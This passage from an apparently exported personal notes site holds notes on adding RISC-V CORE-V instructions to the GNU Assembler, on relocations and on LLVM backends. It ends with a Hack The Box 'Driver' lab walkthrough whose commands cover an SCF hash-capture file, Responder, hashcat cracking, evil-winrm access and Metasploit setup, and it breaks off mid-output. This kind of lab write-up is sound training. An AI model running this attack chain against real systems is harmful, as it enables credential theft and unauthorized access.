INSN_CLASS_COREV_HWLP, \"di,b1\",    MATCH_CV_STARTI, MASK_CV_STARTI, match_opcode, 0}\n```\n\n- Instruction mnemonic: `cv.starti`\n- xLen: base ISA required for this, either `32` (RV32), `64` (RV64) or `0` (both).\n- Instruction class: defined in `include/opcode/riscv.h:riscv_insn_class`.\n- Instruction operands: `di` maps to the loop number and `b1` maps to the unsigned immediate value (`cv.starti Ln(di), uimmL(b1)`).\n- Match and Mask: defined in `include/opcode/riscv-opc.h`, mask being the **preset bits** and match the **opcode**. Instruction masks are used to hard code common encoding fields in the instruction, such as the opcode, and to mask preset bits with 1 in the operand encoding fields. You can see that how it is calculated here. So if you exclusive OR something with the MATCH, and all bits are the same as MASK, then the return will be 0 `((insn ^ MATCH) \u0026 MASK) == 0`.\n\n![Screenshot from 2022-07-20 13-35-38](notes/images/Screenshot%20from%202022-07-20%2013-35-38.png)\n\nHere it hard codes the source register, function, the destination register and the opcode. We then have our match field checking the encoding.\n\n- Match function: determines if a word corresponds to this instruction, if the instruction doesn't require additional assistance then you can use `match_opcode`. It checks the logic behind mask and match:\n\n```c\nstatic int\n\nmatch_opcode (const struct riscv_opcode *op, insn_t insn)\n{\n  return ((insn ^ op-\u003ematch) \u0026 op-\u003emask) == 0;\n}\n```\n\n- Pinfo: collection of bits describing the instruction, mainly any relevant hazard information.\n\n### Riscv-dis.c\nHere we add the instructions to the `print_insn_args` function, which disassembles the bit stream:\n\n```c\n/* CORE-V Specific.  */                                                       \n    case 'b':                                                                                              \n      if (oparg[1] == '1')                                                        \n        {                                                                                                  \n          info-\u003etarget = (EXTRACT_ITYPE_IMM (l)\u003c\u003c1) + pc; ++oparg;                                         \n          (*info-\u003eprint_address_func) (info-\u003etarget, info);                                                \n          break;                                                                                           \n         } \n```\n\n- `EXTRACT_ITYPE_UIMM (l)`: extracts only the required bits from `l`, defined in `include/opcode/riscv.h`:\n\n```c\n#define EXTRACT_CV_HWLP_UIMM5(x) \\                                                                       \n    (RV_X(x, 15, 5))\n```\n\n```c\n #define RV_X(x, s, n)  (((x) \u003e\u003e (s)) \u0026 ((1 \u003c\u003c (n)) - 1)) \n ```\n\nThen we go to `gas/config/tc-riscv.c` and add the instructions to the `validate_riscv_insn` function - which validates all bits in the instruction are set:\n\n```c\ncase 'd':                                                                                              \n      if (oparg[1] == 'i')                                                             \n        {                                                                              \n          used_bits |= ENCODE_CV_HWLP_LN(-1U);                                         \n          ++oparg;                                                                     \n          break;                                                                       \n        } \n```\n\nYou can see this `ENCODE_CV_HWLP_LN` macro in `include/opcode/riscv.h`:\n\n```c\n#define ENCODE_CV_HWLP_LN(x) \\                                                  \n   (RV_X(x, 0, 1) \u003c\u003c 7)  \n```\n\nAdd the operand to the `riscv_ip` function - which assembles an instruction into its binary format:\n\n```c\ncase 'd': /* Destination register.  */                                                             \n          if (oparg[1] == 'i')                                                    \n      {                                                                                                    \n        ++oparg;                                                                  \n        my_getExpression (imm_expr, asarg);                                                                \n        asarg = expr_end;                                                         \n        if (imm_expr-\u003eX_op != O_constant ||                                       \n            imm_expr-\u003eX_add_number \u003c 0 || imm_expr-\u003eX_add_number \u003e 1)             \n          as_bad (_(\"%s loop number must be 0 or 1\"),                                                      \n            ip-\u003einsn_mo-\u003ename);                                                   \n        INSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);                                                  \n        continue;                                                                                          \n      } \n```\n\nIf we look into `INSERT_OPERAND()`: to ensure that the it works correctly, in the RISC-V header file, a mask for the bits encoded for the operand, and the offset of the encoded bits must be defined. These are used in the `INSERT_OPERAND` macro along with the instructions opcode, and the actual value of the operand, to produce the instructions binary representation.\n\n- Add masks to `include/opcode/riscv.h`:\n\n```c\n#define OP_MASK_LN              0x1                                                                      \n#define OP_SH_LN                7\n```\n\n- `OP_MASK_LN`: bits encoded.\n- `OP_SH_LN`: first bit encoded position.\n\nUsed by:\n\n```c\n  /* Change INSN's opcode so that the operand given by FIELD has value VALUE.     \n     INSN is a riscv_cl_insn structure and VALUE is evaluated exactly once.  */   \n  #define INSERT_OPERAND(FIELD, INSN, VALUE) \\                                                             \n    INSERT_BITS ((INSN).insn_opcode, VALUE, OP_MASK_##FIELD, OP_SH_##FIELD)\n```\n\nUsage:\n\n```c\nINSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);\n```\n\n### Testing GAS\n- Input: `test.s`\n- Output: `test.d`\n\n- Tests are in:\n\n```bash\ngas/testsuite/gas/riscv/\n```\n\n- Settings: `riscv.exp`\n- Error output: `test.l`\n\nFor example `cv-hwloop-starti.s`:\n\n```assembly\ntarget:\n      cv.starti 0, 0\n      cv.starti 1, 3020\n      cv.starti 0, 4094\n```\n\nThen the output:\n\n```disassembly\n#as: -march=rv32i_xcorev\n#objdump: -d\n\n.*:[ \t]+file format .*\n\n\nDisassembly of section .text:\n\n0+000 \u003ctarget\u003e:\n[ \t]+0:[ \t]+0000007b[ \t]+cv.starti[ \t]+0,0 \u003ctarget\u003e\n[ \t]+4:[ \t]+5e6000fb[ \t]+cv.starti[ \t]+1,bd0 +\u003ctarget\\+0xbd0\u003e\n[ \t]+8:[ \t]+7ff0007b[ \t]+cv.starti[ \t]+0,1006 +\u003ctarget\\+0x1006\u003e\n```\n\nHere you can see me assembling it manually:\n\n```bash\npietraferreira@tom:~$ cat test-hwlp.s \u0026\u0026 riscv32-corev-elf-as -march=rv32imc_xcorev1p0 test-hwlp.s \u0026\u0026 riscv32-corev-elf-objdump -rd a.out \ncv.starti 0, 0\ncv.starti 1, 3020\ncv.starti 0, 4094 \n\na.out:     file format elf32-littleriscv\n\n\nDisassembly of section .text:\n\n00000000 \u003c.text\u003e:\n   0:\t0000007b          \tcv.starti\t0,0x0\n   4:\t5e6000fb          \tcv.starti\t1,0xbd0\n   8:\t7ff0007b          \tcv.starti\t0,0x1006\n```",
    "lastmodified": "2022-11-24T12:20:58.976101995Z",
    "tags": null
  },
  "/notes/general/how-to-add-instructions-to-as-slides": {
    "title": "",
    "content": "# How to add instructions to the GNU Assembler\n---\n## Instruction Example\n\nUsing **cv.starti** as an example:\n\n```\ncv.starti Ln, uimmL\n```\n\n- **Ln**: 0 for inner loop, 1 for outer loop.\n- **uimmL**: offset of the start of the loop.\n\n![Image](file:///home/pietra/Pictures/starti-bits.png)\n\n---\n## Summary of changes\nWe mainly need to change the **opcodes** library.\n\n1. Table driven encoding and decoding of instructions (**riscv-opc.c** (encoding) and **riscv-dis.c** (decoding)).\n2. Change the assembler (**gas/config**) to use the new tables (**tc-riscv.c** and **tc-riscv.h**).\n3. Extend relocations: modify BFD in **bfd/**.\n\n---\n## Encoding (riscv-opc.c)\n```c\n{\"cv.starti\", 0, INSN_CLASS_COREV_HWLP, \"di,b1\",  \n  MATCH_CV_STARTI, MASK_CV_STARTI, match_opcode, 0}\n```\n\n- Instruction mnemonic: **cv.starti**\n- xlen: base ISA required for this, either **32** (RV32), **64** (RV64) or **0** (both).\n- Instruction class: defined in **include/opcode/riscv.h:riscv_insn_class**.\n- Instruction operands: **di** maps to the loop number and **b1** maps to the unsigned immediate value (**cv.starti Ln(di), uimmL(b1)**).\n---\n- Match and Mask: defined in **include/opcode/riscv-opc.h**\n- Mask -\u003e **preset bits**, hard code common encoding fields in the instruction, such as the opcode.\n- Match -\u003e the **opcode**, mask preset bits with 1 in the operand encoding fields.\n\n---\n\nYou can see that how it is calculated here. So if you exclusive OR something with the MATCH, and all bits are the same as MASK, then the return will be 0:\n\n**((insn ^ MATCH) \u0026 MASK) == 0**.\n\n![file:///home/pietra/Pictures/starti-mask-match.png](file:///home/pietra/Pictures/starti-mask-match.png)\nHere it hard codes the **source register**, **function**, the **destination register** and the **opcode**. \n\n---\nWe then have our match field checking the encoding.\n- **Match function**: determines if a word corresponds to this instruction, if the instruction doesn't require additional assistance then you can use **match_opcode**. It checks the logic behind mask and match:\n\n```c\nstatic int\n\nmatch_opcode (const struct riscv_opcode *op, insn_t insn)\n{\n  return ((insn ^ op-\u003ematch) \u0026 op-\u003emask) == 0;\n}\n```\n\n---\n- Pinfo: collection of bits describing the instruction, mainly any relevant hazard information.\n---\n## Decoding\nAdd instructions to the **print_insn_args** function, which disassembles the bit stream:\n\n```c\n/* CORE-V Specific.  */                                                       \n    case 'b':                                                                                              \n      if (oparg[1] == '1')                                                        \n        {                                                                                                  \n          info-\u003etarget = (EXTRACT_ITYPE_IMM (l)\u003c\u003c1) + pc; ++oparg;                                         \n          (*info-\u003eprint_address_func) (info-\u003etarget, info);                                                \n          break;                                                                                           \n         } \n```\n---\n- **EXTRACT_ITYPE_UIMM (l)**: extracts only the required bits from **l**, defined in **include/opcode/riscv.h**:\n\n```c\n#define EXTRACT_CV_HWLP_UIMM5(x) \\                                                                       \n    (RV_X(x, 15, 5))\n```\n\n```c\n #define RV_X(x, s, n)  (((x) \u003e\u003e (s)) \u0026 ((1 \u003c\u003c (n)) - 1)) \n ```\n\n---\n\nThen we go to **gas/config/tc-riscv.c** and add the instructions to the **validate_riscv_insn** function - which validates all bits in the instruction are set:\n\n```c\ncase 'd':                                                                                              \n      if (oparg[1] == 'i')                                                             \n        {                                                                              \n          used_bits |= ENCODE_CV_HWLP_LN(-1U);                                         \n          ++oparg;                                                                     \n          break;                                                                       \n        } \n```\n\n---\nYou can see this **ENCODE_CV_HWLP_LN** macro in **include/opcode/riscv.h**:\n\n```c\n#define ENCODE_CV_HWLP_LN(x) \\                                                  \n   (RV_X(x, 0, 1) \u003c\u003c 7)  \n```\n\n---\nAdd the operand to the `riscv_ip` function - which assembles an instruction into its binary format:\n\n```c\ncase 'd': /* Destination register.  */                                                             \n          if (oparg[1] == 'i')                                                    \n      {                                                                                                    \n        ++oparg;                                                                  \n        my_getExpression (imm_expr, asarg);                                                                \n        asarg = expr_end;                                                         \n        if (imm_expr-\u003eX_op != O_constant ||                                       \n            imm_expr-\u003eX_add_number \u003c 0 || imm_expr-\u003eX_add_number \u003e 1)             \n          as_bad (_(\"%s loop number must be 0 or 1\"),                                                      \n            ip-\u003einsn_mo-\u003ename);                                                   \n        INSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);                                                  \n        continue;                                                                                          \n      } \n```\n\n---\n**INSERT_OPERAND()**: to ensure that the it works correctly (in the RISC-V header file) a **mask** for the bits encoded for the operand and the **offset** of the encoded bits must be defined.\n\nThese are used in the **INSERT_OPERAND** macro along with the instructions opcode, and the actual value of the operand, to produce the instructions binary representation.\n\n---\n- Add masks to `include/opcode/riscv.h`:\n\n```c\n#define OP_MASK_LN              0x1                                                                      \n#define OP_SH_LN                7\n```\n\n- **OP_MASK_LN**: bits encoded.\n- **OP_SH_LN**: first bit encoded position.\n\nUsed by:\n\n```c\n  /* Change INSN's opcode so that the operand given by FIELD has value VALUE.     \n     INSN is a riscv_cl_insn structure and VALUE is evaluated exactly once.  */   \n  #define INSERT_OPERAND(FIELD, INSN, VALUE) \\                                                             \n    INSERT_BITS ((INSN).insn_opcode, VALUE, OP_MASK_##FIELD, OP_SH_##FIELD)\n```\n\n---\nUsage:\n\n```c\nINSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);\n```\n\n---\n## Testing GAS\n- Input: **\\\u003cfilename\\\u003e.s**\n- Output: **\\\u003cfilename\\\u003e.d**\n- Error output: **\\\u003cfilename\\\u003e.l**\n\n- Tests are in **gas/testsuite/gas/riscv/**.\n- Settings are in **riscv.exp**.\n\n---\nFor example `cv-hwloop-starti.s`:\n\n```assembly\ntarget:\n      cv.starti 0, 0\n      cv.starti 1, 3020\n      cv.starti 0, 4094\n```\n\n```disassembly\n#as: -march=rv32i_xcorev\n#objdump: -d\n\n.*:[ \t]+file format .*\n\n\nDisassembly of section .text:\n\n0+000 \u003ctarget\u003e:\n[ \t]+0:[ \t]+0000007b[ \t]+cv.starti[ \t]+0,0 \u003ctarget\u003e\n[ \t]+4:[ \t]+5e6000fb[ \t]+cv.starti[ \t]+1,bd0 +\u003ctarget\\+0xbd0\u003e\n[ \t]+8:[ \t]+7ff0007b[ \t]+cv.starti[ \t]+0,1006 +\u003ctarget\\+0x1006\u003e\n```\n\n---\nHere you can see me assembling it manually:\n\n```bash\npietraferreira@tom:~$ cat test-hwlp.s \u0026\u0026 riscv32-corev-elf-as -march=rv32imc_xcorev1p0 test-hwlp.s \u0026\u0026 riscv32-corev-elf-objdump -rd a.out \ncv.starti 0, 0\ncv.starti 1, 3020\ncv.starti 0, 4094 \n\na.out:     file format elf32-littleriscv\n\n\nDisassembly of section .text:\n\n00000000 \u003c.text\u003e:\n   0:\t0000007b          \tcv.starti\t0,0x0\n   4:\t5e6000fb          \tcv.starti\t1,0xbd0\n   8:\t7ff0007b          \tcv.starti\t0,0x1006\n```\n\n---\n## Zc*\nGroup of extensions which define subsets of the existing C extensions (**Zca**, **Zcf**) and new extensions which only contain 16-bit encodings.\n\nThere seems to be no tests for any **Zc** instructions.\n\n---\n### Zca\nAll of the existing C extension, **excluding** all 16-bit floating point loads and stores: c.flw, c.flwsp, c.fsw, c.fswsp, c.fld, c.fldsp, c.fsd, c.fsdsp.\n\nIt seems like it defines a subset of C with the floating point load/stores removed (**excl.c.f**).\n\n---\n### Zcf (RV32 only)\nIt is the existing set of single precision floating point loads and stores: c.flw, c.flwsp, c.fsw, c.fswsp.\n\nIt **requires** Zca.\n\n---\n### Zcb\nHeavily depends on other extensions.\n\nFor example, **c.mul** is only implemented if **M** or **Zmmul** is implemented, **c.sext.b** is only implemented if **Zbb** is implemented.\n\nHere we have loads, stores, zero/sign extend, not and multiply. All but **c.not** are compatible with **RV32** and **RV64**.\n\n---\n### Zcmb\nThis is **incompatible** with the full C-extension, however it is compatible with **F**, **D** and **Zdinx**.\n\nIt requires **Zcb**, which requires **Zca**.\n\n---\n## Example\n**c.lbu**: load unsigned byte, 16-bit encoding: \n\n`c.lbu rd', uimm(rs1')`\n\n![file:///home/pietra/Pictures/clbu-encoding.png](file:///home/pietra/Pictures/clbu-encoding.png)\n\n| FUNCT3 | --- | rs1 | uimm | rd  | c0  |\n| ------ | --- | --- | ---- | --- | --- |\n| 100    | 000 | rrr | ii   | ddd | 00  |\n\n---\n**cm.lbu**: load unsigned byte, 16-bit encoding:\n\n`cm.lbu rd', uimm(rs1')`\n\n![file:///home/pietra/Pictures/cmlbu-encoding.png](file:///home/pietra/Pictures/cmlbu-encoding.png)\n\nHow is it different?\n\n**cm.lbu** can load longer immediates. \n\n---\n**riscv-dis.c** -\u003e In this file there is a function called **print_insn_args** which disassembles a bit stream. All operands must be added to this function. We can use this to ensure that our instructions are being printed out correctly during assembly.\n\nThe example on this slide is the branch offset operand, b1. I would like to draw your attention to the EXTRACT macro, which must be defined in the include/opcode directory in the riscv header file. This macro extracts only the bits used for the b1 operand from the bit stream. The other operations are specific for this operand. The immediate field refers to a half word address, because instructions are on half word boundaries. We shift it left 1 bit to turn it into a full byte address and the PC is required as the offset is PC relative.",
    "lastmodified": "2022-11-24T12:20:58.838455796Z",
    "tags": null
  },
  "/notes/general/how-to-manually-check-as-test": {
    "title": "How to Manually Check a Test",
    "content": "# How to Manually Check a Test\n---\nInstruction listing:\n\n![Pasted image 20220727125733](notes/images/Pasted%20image%2020220727125733.png)\n![Pasted image 20220727125701](notes/images/Pasted%20image%2020220727125701.png)\n\nSo we have:\n\n```bash\n011u uurr ruud dd00\n```\n\nFor example, if we want to test:\n\n```assembly\nflw fa0, 100(a0)\n```\n\nIt decompiles to:\n\n```assembly\n4:\t7168                \tc.flw\tfa0,100(a0)\n```\n\nHere we have the register encoding for compressed instructions:\n\n![Pasted image 20220727130200](notes/images/Pasted%20image%2020220727130200.png)\n\n100 in binary is `0110 0100`, where:\n\n|  7  | 6   | 5   | 4   | 3   | 2   | 1   | 0   |\n| --- | --- | --- | --- | --- | --- | --- | --- |\n| 0   | 1   | 1   | 0   | 0   | 1   | 0   | 0   |\n\nWe will first use bits 5 to 3, then 2 followed by 6 as you can see in the encoding.\n\nSo the final encoding would look like this:\n\n```bash\n011u uurr ruud dd00\n\nu = 0110 0100\nr = 010\nd = 010\n\n0111 0001 0110 1000\n```\n\nWhich in hex is: 7168 - matching exactly the decoding.",
    "lastmodified": "2022-11-24T12:20:59.099590898Z",
    "tags": null
  },
  "/notes/general/how-to-write-a-llvm-backend": {
    "title": "How to Write a LLVM Backend",
    "content": "# How to Write a LLVM Backend\n---\nMore information [here](https://llvm.org/docs/WritingAnLLVMBackend.html).\n\nLLVM converts LLVM IR to code for a specific target, the steps are:\n1. Create a subclass of the **TargetMachine** class (describes the actual target machine characteristics - `BSCTargetMachine.h` and `BSCTargetMachine.cpp`)\n2. Describe the register set of the target. TableGen generates code for register definition, aliases and classes from a target-specific file (`BSCRegisterInfo.td`)\n3. Describe the instruction set of the target, you should write a subclass of the `TargetInstrInfo` class to represent machine instructions supported by the target machine.\n4. Describe the selection and conversion of the LLVM IR from a DAG representation of instructions. Write code for `ISelLowering.cpp` to replace or remove operations and data types that are not supported natively in a SelectionDAG.\n5. Write code for assembly printer, which converts LLVM IR to a GAS format for the target machine. Add assembly strings to the instructions defined in target-specific version of `TargetInstInfo.td`, also code for a subclass of `AsmPrinter` that performs the LLVM-to-assembly conversion.\n6. Add support for subtargets, also subclass which allows the use of `-mcpu=` and `-matter=`.\n7. Optionally JIT support.\n\n* `BSCTargetMachine.h` - declares the BSC specific subclass of TargetMachine\n* `BSCTargetMachine.cpp` - implements the BSC specific subclass of TargetMachine",
    "lastmodified": "2022-11-24T12:20:59.162714601Z",
    "tags": null
  },
  "/notes/general/howto-table": {
    "title": "Howto Table",
    "content": "# Howto Table\n---\nThe [relocation](notes/general/relocations.md) table records the list of items that the file needs (from other object files or libraries).\n\nThe relocation record contains information like: which instructions need to be relocated (the offsets), which symbols are involved with the relocation and how to relocate the files relative to the symbols.\n\n## Definition\n```c\nHOWTO (R_RISCV_CVPCREL_UI12,          /* type */\n         1,                             /* rightshift */\n         2,                             /* size */\n         32,                            /* bitsize */\n         TRUE,                          /* pc_relative */\n         0,                             /* bitpos */\n         complain_overflow_unsigned,    /* complain_on_overflow */\n         bfd_elf_generic_reloc,         /* special_function */\n         \"R_RISCV_CVPCREL_UI12\",        /* name */\n         FALSE,                         /* partial_inplace */\n         0,                             /* src_mask */\n         ENCODE_ITYPE_IMM (-1U),        /* dst_mask */\n         TRUE),                         /* pcrel_offset */\n```\n\n* _type_: type field is there mainly for documentary use, meaning that the back end can do what it wants with it. It is important to note that normally the back end will store their idea of an external relocation number in this field.\n* _right shift_: the value the final relocation is shifted right by, it drops any unwanted data from the relocation\n* _size_: encoded size of the item to be relocated, it is not a power of two measure. You can use `bfd_get_reloc_size` to find the size of the item in bytes.\n* _bitsize_: the number of bits in the field to be relocated, it is used when doing overflow checking.\n* _pc_relative_: boolean -\u003e if the relocation is relative to the item being relocated.\n* _bitpos_: the bit position of the relocation value in the destination. The relocated value is left shifted by this amount.\n* _complain_on_overflow_: what type of overflow error should be checked for when relocating -\u003e Complain if the value overflows when considered as an unsigned number.\n* _special_function_: if this field is non-null (it is) then the supplied function is called rather than the normal function, allowing really strange relocations to be accomplished.\n  * _bfd_elf_generic_reloc_: in `bfd/elf.c:1307` -\u003e it is for relocations against symbols (`SHT_RELA` etc).\n* _name_: textual name of the relocation type.\n* _partial_inplace_: some formats record a relocation addend in the section contents rather than with the relocation. For ELF formats this is the distinction between `USE_REL` and `USE_RELA`. The value is false if addends are recorded within the relocations. All relocations for all ELF `USE_RELA` targets should set this field to false.\n* _src_mask_: it detected the part of the instruction to be used in the relocation sum -\u003e if relocations do have an addend in the relocation, then this field should normally be zero.\n* _dst_mask_: selects which part of the instruction are replaced with a relocated value.\n* _pcrel_offset_: when some formats create PC relative instructions, they leave the value of the pc of the place being relocated in the offset slot of the instruction, so that a PC relative relocation can be made by just adding in an ordinary offset. in the cases that the displacement part of the instruction is empty, this flags signals the fact.\n\n## Related Notes\n- [Relocations](notes/general/relocations.md)\n- [PLT and GOT](notes/general/plt-and-got.md)\n- [Linker](notes/general/linker.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/general/jump-table.md)",
    "lastmodified": "2022-11-24T12:20:59.189589262Z",
    "tags": null
  },
  "/notes/general/htb-driver": {
    "title": "HTB - Driver",
    "content": "# HTB - Driver\n---\nPrinter exploitation!!\n\nIP: 10.10.11.106\n\n```bash\nsudo nmap -sC -sV -oA driver.nmap $ip\n```\n\nWhere:\n- `-sC`: default scripts.\n- `-sV`: version detection (`-A` enables version detection, OS detection, script scanning and traceroute).\n- `-oA`: output to all formats.\n\nOutput:\n\n```bash\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 18:26 BST\nNmap scan report for 10.10.11.106\nHost is up (0.027s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT    STATE SERVICE      VERSION\n80/tcp  open  http         Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=MFP Firmware Update Center. Please enter password for admin\n135/tcp open  msrpc        Microsoft Windows RPC\n445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-time: \n|   date: 2022-07-18T00:26:41\n|_  start_date: 2022-07-18T00:22:54\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 52.10 seconds\n```\n\nWe have **Microsoft IIS 10.0** in port 80, so Windows. It is a **MFP Firmware Update Center** with the username `admin`.\n\nWe also have 135 and 445, so it is listening on **SMB**.\n\nWe can try:\n\n```bash\nsmbclient -L \\\\$ip\n\nEnter WORKGROUP\\hanato's password: \nsession setup failed: NT_STATUS_ACCESS_DENIED\n\nsmbclient -N -L \\\\$ip\nsession setup failed: NT_STATUS_ACCESS_DENIED\n```\n\n- `-L`: list.\n- `-N`: no pass, suppresses the normal password prompt, useful when there is no password.\n\nWe can use CrackMapExec ([CME](https://wiki.porchetta.industries/)). It automates assessing the security of **large** Active Directory networks. It makes heavy use of **Impacket**. More info [here](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/).\n\n```bash\ncme smb 10.10.11.106\n\nSMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)\n```\n\nSo the host is **Windows 10 Enterprive 10240 x64**. It could be either a domain controller or a windows bus. \n\nWe go in the website and try the login `admin:admin` which works! We can see in firmware updates that we can upload a file, very promising. Also, the URL ends in `.php`.\n\nWe can enumerate the directories:\n\n```bash\ngobuster dir -u http://10.10.11.106 -U admin -P admin -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out\n```\n\n- `-U`: username.\n- `-P`: password.\n- `-x`: file type.\n\nOk, while this is running we can explore the website. We could probably try a [SCF file attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).\n\nThe SCF:\n\n```bash\n`[Shell]`\n\n`Command=``2`\n\n`IconFile=\\\\X.X.X.X\\share\\pentestlab.ico`\n\n`[Taskbar]`\n\n`Command=ToggleDesktop`\n```\n\nWe can use **Responder** (in `/usr/share/responder`). I forgot THM open so I'll be using **tun1** not **tun0**:\n\n```bash\nsudo ./Responder.py -I tun1\n```\n\nThen we upload our **SCF** file, we get:\n\n```bash\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.11.106\n[SMB] NTLMv2-SSP Username : DRIVER\\tony\n[SMB] NTLMv2-SSP Hash     : tony::DRIVER:3cf31016af90b3fn[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n```\n\nI will try to figure out the hash:\n\n```bash\nhashcat driver.hash -m 5600 /usr/share/wordlists/rockyou.txt\n\nHost memory required for this attack: 64 MB\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 1 sec\n\nTONY::DRIVER:3cf31016af90b3f5:27f3bafd0569b4bccb3512953792f56c:01010000000000000093f52b139ad80176c9f467fdfad8a90000000002000800570056004b00510001001e00570049004e002d004a0047004d00340050004b004a00330038003200470004003400570049004e002d004a0047004d00340050004b004a0033003800320047002e00570056004b0051002e004c004f00430041004c0003001400570056004b0051002e004c004f00430041004c0005001400570056004b0051002e004c004f00430041004c00070008000093f52b139ad80106000400020000000800300030000000000000000000000000200000c0ed0045d2efea0fab50e04ee1cabf0c376e10707eb410b0555517338a2c53a40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000:liltony\n```\n\n- `-m`: the type of hash, figured out by looking at [this](https://hashcat.net/wiki/doku.php?id=example_hashes) table.\n\nThe password is `liltony`! We can now do:\n\n```bash\ncme smb 10.10.11.106 -u tony -p lilton\n\nSMB         10.10.11.106    445    DRIVER           [*] Windows 10.0 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:False)\nSMB         10.10.11.106    445    DRIVER           [+] DRIVER\\tony:liltony\n\ncme smb 10.10.11.106 -u tony -p liltony --shares                                                                                                                                                                            7s\nSMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)\nSMB         10.10.11.106    445    DRIVER           [+] DRIVER\\tony:liltony \nSMB         10.10.11.106    445    DRIVER           [+] Enumerated shares\nSMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark\nSMB         10.10.11.106    445    DRIVER           -----           -----------     ------\nSMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin\nSMB         10.10.11.106    445    DRIVER           C$                              Default share\nSMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC\n```\n\nWe can also try `winrm` (Windows Remote Management), which normally uses ports 5985 and 5986:\n\n```bash\nnmap -p5985,5986 10.10.11.106 -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 19:36 BST\nNmap scan report for 10.10.11.106\nHost is up (0.035s latency).\n\nPORT     STATE    SERVICE\n5985/tcp open     wsman\n5986/tcp filtered wsmans\n\nNmap done: 1 IP address (1 host up) scanned in 3.45 seconds\n```\n\n- `-n`: no DNS resolution.\n\nWe can see that 5985 is indeed open :)\n\n```bash\ncme winrm 10.10.11.106 -u tony -p liltony                                                                                                                                                                                   4s\nSMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)\nHTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman\nWINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\\tony:liltony (Pwn3d\n```\n\nWe can use **[evil-winrm](https://github.com/Hackplayers/evil-winrm)** to exploit this. \n\n```bash\nevil-winrm -i 10.10.11.106 -u tony -p liltony \n*Evil-WinRM* PS C:\\Users\\tony\\Documents\u003e\n```\n\nNow we can use something like **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)** (by the way, `gobuster` finishes, nothing interesting unfortunaly).\n\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents\u003e cd \\programdata\n*Evil-WinRM* PS C:\\programdata\u003e upload exes/winPEASany.exe\n```\n\nWe can see it has `RICOH` in it (from our `winPEAS` output):\n\n```bash\nC:\\Users\\All Users\\RICOH_DRV\\RICOH PCL6 UniversalDriver V4.23\n     C:\\Users\\All Users\\RICOH_DRV\\RICOH PCL6 UniversalDriver V4.23\\do_not_delete_folders\n     C:\\Users\\All Users\\RICOH_DRV\\RICOH PCL6 UniversalDriver V4.23\\_com\n```\n\nInfo about the exploit [here](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/).\n\nSo we don't need Administrator privilege to add a printer, just to add drivers. Therefore if the driver is there, we are all good. The `.dll` files are write-able by everyone.\n\nMetasploit time!!!\n\nWe are going to use `exploit/windows/winrm/winrm_script_exe` with the following options:\n\n```bash\nModule options (exploit/windows/winrm/winrm_script_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification\n   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager\n   PASSWORD   liltony          yes       A specific password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.11.106     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT      5985             yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL 